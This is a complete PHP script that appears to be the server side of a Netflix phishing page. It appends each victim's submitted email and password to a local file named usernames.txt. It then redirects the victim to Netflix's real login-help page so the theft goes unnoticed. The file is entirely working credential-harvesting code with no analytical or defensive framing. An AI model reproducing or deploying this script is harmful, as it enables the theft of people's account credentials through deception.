<?php
file_put_contents("../usernames.txt", "netflix Username: " . $_POST['email'] . " Pass: " . $_POST['password'] ."\n", FILE_APPEND);
header('Location: https://www.netflix.com/us/LoginHelp');
exit();
?>